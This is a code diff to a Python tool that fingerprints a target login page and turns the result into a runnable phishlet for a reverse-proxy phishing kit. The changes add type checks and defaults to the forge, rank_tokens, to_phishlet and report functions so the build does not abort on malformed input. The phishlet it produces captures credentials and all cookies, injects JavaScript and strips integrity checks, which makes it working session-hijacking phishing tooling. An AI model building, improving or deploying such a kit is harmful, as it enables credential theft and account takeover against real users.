@@ -302,19 +302,31 @@ def forge(url, ua=None, verify=True, timeout=25, snapshot=None, headers=None):
     hdrs = {"User-Agent": ua or DEFAULT_UA,
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
             "Accept-Language": "en-US,en;q=0.9"}
-    hdrs.update(headers or {})
+    # Defect: a non-mapping headers argument raised TypeError on .update();
+    # only a mapping of header overrides is meaningful.
+    if isinstance(headers, dict):
+        hdrs.update(headers)
     notes = []
     status, final_url, body, set_cookies = 0, url, "", []
 
+    if snapshot and not isinstance(snapshot, dict):
+        # a snapshot that is not a {path: entry} map cannot be analysed
+        notes.append("snapshot was not a mapping - ignored")
+        snapshot = None
     if snapshot:
         key = parsed.path or "/"
         entry = snapshot.get(url) or snapshot.get(key)
-        if entry is None:
+        if not isinstance(entry, dict):
             notes.append(f"snapshot has no entry for {key!r} - nothing analysed")
             entry = {}
         status = int(entry.get("status", 200))
         body = entry.get("body", "") or ""
-        raw_sc = (entry.get("headers") or {}).get("Set-Cookie", [])
+        # Defect: entry["headers"] was assumed to be a mapping; a hand-written
+        # snapshot that put headers in a string raised AttributeError.
+        entry_headers = entry.get("headers")
+        if not isinstance(entry_headers, dict):
+            entry_headers = {}
+        raw_sc = entry_headers.get("Set-Cookie", [])
         # a hand-written snapshot carries it as one string; iterating a string
         # would yield its characters as cookie names
         if isinstance(raw_sc, str):
@@ -506,7 +518,9 @@ def rank_tokens(names):
     site sets would mean the session never registers as captured.
     """
     required, optional = [], []
-    for n in names:
+    # Defect: rank_tokens(None) raised TypeError; a caller with no tokens found
+    # passed None and the report/build aborted.
+    for n in (names or []):
         low = str(n).lower()
         if _word_hit(low, ("csrf", "xsrf")):
             # a CSRF token is never the session: requiring it means a site that
@@ -553,27 +567,32 @@ def to_phishlet(analysis, name=None, upstream=None):
     """Turn an analysis into a runnable Phishlet."""
     from .phishlet import AuthToken, CredentialField, JsInject, Phishlet, ProxyHost, SubFilter
 
+    # Defect: a partial/hand-edited analysis raised KeyError here (h["domain"],
+    # v["key"]); every field is read with .get so a missing key degrades instead
+    # of aborting the build mid-engagement.
+    analysis = analysis if isinstance(analysis, dict) else {}
     dom = analysis.get("domain") or analysis.get("host") or ""
     phishlet = Phishlet(
         name=name or (dom.replace(".", "-") + "-login" if dom else "forged"),
         upstream=upstream or analysis.get("host") or "",
-        proxy_hosts=[ProxyHost(domain=h["domain"], phish_sub=h.get("phish_sub", ""),
+        proxy_hosts=[ProxyHost(domain=h.get("domain", ""), phish_sub=h.get("phish_sub", ""),
                                orig_sub=h.get("orig_sub", ""),
                                session=bool(h.get("session", True)),
                                is_landing=bool(h.get("is_landing")))
-                     for h in analysis.get("proxy_hosts", [])],
-        sub_filters=[SubFilter(search=f["search"], replace=f["replace"],
+                     for h in analysis.get("proxy_hosts", []) if isinstance(h, dict)],
+        sub_filters=[SubFilter(search=f.get("search", ""), replace=f.get("replace", ""),
                                mimes=f.get("mimes"))
-                     for f in analysis.get("sub_filters", [])],
+                     for f in analysis.get("sub_filters", []) if isinstance(f, dict)],
         js_inject=[JsInject(trigger_domains=j.get("trigger_domains"),
                             trigger_paths=j.get("trigger_paths"),
                             mimes=j.get("mimes"))
-                   for j in analysis.get("js_inject", [])],
+                   for j in analysis.get("js_inject", []) if isinstance(j, dict)],
         auth_tokens=[AuthToken(keys=req) for req in _token_specs(analysis)],
         auth_urls=list(analysis.get("auth_urls", [])),
-        credentials={k: CredentialField(v["key"], v.get("search", "(.*)"),
+        credentials={k: CredentialField(v.get("key", k), v.get("search", "(.*)"),
                                         v.get("type", "post"))
-                     for k, v in (analysis.get("credentials") or {}).items()},
+                     for k, v in (analysis.get("credentials") or {}).items()
+                     if isinstance(v, dict)},
         capture_cookies=["*"], inject_paths=[".*"], strip_integrity=True,
     )
     return phishlet
@@ -603,7 +622,13 @@ def write(analysis, path, name=None, upstream=None):
 
 def report(analysis):
     """Human-readable summary: what was found, and what needs a human look."""
-    c = analysis.get("confidence", {})
+    # Defect: a partial/hand-edited analysis raised KeyError (h["domain"],
+    # v["key"]) or AttributeError (a non-dict confidence) while printing the
+    # report. Read everything defensively so a report always renders.
+    analysis = analysis if isinstance(analysis, dict) else {}
+    c = analysis.get("confidence")
+    if not isinstance(c, dict):
+        c = {}
     lines = []
     lines.append(f"target     : {analysis.get('final_url')}")
     lines.append(f"status     : {analysis.get('status')}   title: {analysis.get('title')!r}")
@@ -615,13 +640,18 @@ def report(analysis):
     lines.append(f"proxy_hosts ({len(analysis.get('proxy_hosts', []))}) "
                  f"[{c.get('proxy_hosts')}]")
     for h in analysis.get("proxy_hosts", []):
-        lines.append(f"   {h['domain']:<28} sub={h.get('orig_sub') or '-':<12} "
+        if not isinstance(h, dict):
+            continue
+        lines.append(f"   {h.get('domain', ''):<28} sub={h.get('orig_sub') or '-':<12} "
                      f"session={h.get('session')} landing={h.get('is_landing')} "
                      f"({','.join(h.get('reasons', []))})")
     lines.append("")
     lines.append(f"credentials [{c.get('credentials')}]")
     for k, v in (analysis.get("credentials") or {}).items():
-        lines.append(f"   {k:<10} field={v['key']!r} type={v['type']} search={v['search']!r}")
+        if not isinstance(v, dict):
+            continue
+        lines.append(f"   {k:<10} field={v.get('key')!r} type={v.get('type', 'post')} "
+                     f"search={v.get('search', '(.*)')!r}")
     if not analysis.get("credentials"):
         lines.append("   none found - inspect the login form by hand")
     lines.append("")
